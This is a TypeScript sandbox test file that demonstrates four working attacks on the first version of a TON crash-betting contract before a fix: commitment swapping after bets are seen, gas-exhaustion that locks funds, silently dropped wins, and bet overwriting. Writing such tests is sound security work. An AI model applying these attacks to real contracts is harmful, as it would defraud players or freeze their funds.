// Attacks on the first version of the contract. Every test here passes against that
// version, which means every attack works. The next commit fixes the contract and
// replaces these tests with ones that show each attack failing.
import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { toNano } from '@ton/core';
import { sha256_sync } from '@ton/crypto';
import { Fairness } from '../build/Fairness/Fairness_Fairness';
import '@ton/test-utils';

const commit = (seed: string) => BigInt('0x' + sha256_sync(seed).toString('hex'));
const E = 4503599627370496n;
function crash(seed: string, clientSeed: string, nonce: number): bigint {
    let h = BigInt('0x' + sha256_sync(`${seed}:${clientSeed}:${nonce}`).toString('hex')) >> 204n;
    if (h === 0n) h = 1n;
    const x100 = (100n * E - h) / (E - h);
    return x100 < 100n ? 100n : x100;
}
const findNonce = (seed: string, client: string, pred: (c: bigint) => boolean) => {
    for (let n = 0; n < 10_000; n++) if (pred(crash(seed, client, n))) return n;
    throw new Error('no nonce');
};

describe('attacks on the first version', () => {
    let chain: Blockchain;
    let owner: SandboxContract<TreasuryContract>;
    let player: SandboxContract<TreasuryContract>;
    let game: SandboxContract<Fairness>;

    beforeEach(async () => {
        chain = await Blockchain.create();
        owner = await chain.treasury('owner');
        player = await chain.treasury('player');
        game = chain.openContract(await Fairness.fromInit(owner.address));
        await game.send(owner.getSender(), { value: toNano('0.05') }, { $$type: 'Deploy', queryId: 0n });
    });

    it('the owner replaces the commitment after seeing the bets', async () => {
        const seedA = 'honest-seed', client = 'player-1';
        const nonce = findNonce(seedA, client, c => c >= 300n);   // with seed A the 2x bet wins
        await game.send(owner.getSender(), { value: toNano('0.05') }, { $$type: 'Commit', commitment: commit(seedA) });
        await game.send(owner.getSender(), { value: toNano('10') }, 'fund');
        await game.send(player.getSender(), { value: toNano('1') },
            { $$type: 'PlaceBet', target: 200n, clientSeed: client, nonce: BigInt(nonce) });

        // The bet is public, so the owner looks for a seed under which it loses.
        let seedB = '';
        for (let i = 0; ; i++) { seedB = `other-${i}`; if (crash(seedB, client, nonce) < 200n) break; }
        const swap = await game.send(owner.getSender(), { value: toNano('0.05') }, { $$type: 'Commit', commitment: commit(seedB) });
        expect(swap.transactions).toHaveTransaction({ to: game.address, success: true });

        const reveal = await game.send(owner.getSender(), { value: toNano('0.05') }, { $$type: 'Reveal', serverSeed: seedB });
        expect(reveal.transactions).toHaveTransaction({ to: game.address, success: true });
        expect(reveal.transactions).not.toHaveTransaction({ from: game.address, to: player.address });
        expect(await game.getVerified()).toBe(true);
    });

    it('76 bets make the round impossible to reveal, and nothing can be withdrawn', async () => {
        const seed = 'crowded-round';
        await game.send(owner.getSender(), { value: toNano('0.05') }, { $$type: 'Commit', commitment: commit(seed) });
        await game.send(owner.getSender(), { value: toNano('100') }, 'fund');
        for (let i = 0; i < 76; i++) {
            const p = await chain.treasury(`p${i}`);
            await game.send(p.getSender(), { value: toNano('0.03') },
                { $$type: 'PlaceBet', target: 101n, clientSeed: `c${i}`, nonce: 0n });
        }
        const reveal = await game.send(owner.getSender(), { value: toNano('1') }, { $$type: 'Reveal', serverSeed: seed });
        expect(reveal.transactions).toHaveTransaction({ to: game.address, success: false, exitCode: -14 }); // out of gas
        expect(await game.getVerified()).toBe(false);
        // The contract has no refund and no withdraw: the 100 TON bankroll and the stakes stay where they are.
        expect((await chain.getContract(game.address)).balance).toBeGreaterThan(toNano('100'));
    }, 120_000);

    it('a win the bankroll cannot cover is dropped without an error', async () => {
        const seed = 'empty-bank', client = 'lucky';
        const nonce = findNonce(seed, client, c => c >= 1000n);
        await game.send(owner.getSender(), { value: toNano('0.05') }, { $$type: 'Commit', commitment: commit(seed) });
        await game.send(player.getSender(), { value: toNano('1') },
            { $$type: 'PlaceBet', target: 1000n, clientSeed: client, nonce: BigInt(nonce) });
        const reveal = await game.send(owner.getSender(), { value: toNano('0.05') }, { $$type: 'Reveal', serverSeed: seed });
        expect(reveal.transactions).toHaveTransaction({ from: owner.address, to: game.address, success: true });
        expect(reveal.transactions).not.toHaveTransaction({ from: game.address, to: player.address });
        expect(await game.getBetOf(player.address)).toBeNull();
    });

    it('a second bet from the same wallet replaces the first', async () => {
        await game.send(owner.getSender(), { value: toNano('0.05') }, { $$type: 'Commit', commitment: commit('s') });
        await game.send(player.getSender(), { value: toNano('5') }, { $$type: 'PlaceBet', target: 150n, clientSeed: 'a', nonce: 1n });
        await game.send(player.getSender(), { value: toNano('1') }, { $$type: 'PlaceBet', target: 150n, clientSeed: 'a', nonce: 2n });
        expect((await game.getBetOf(player.address))!.amount).toBe(toNano('0.98'));
    });
});
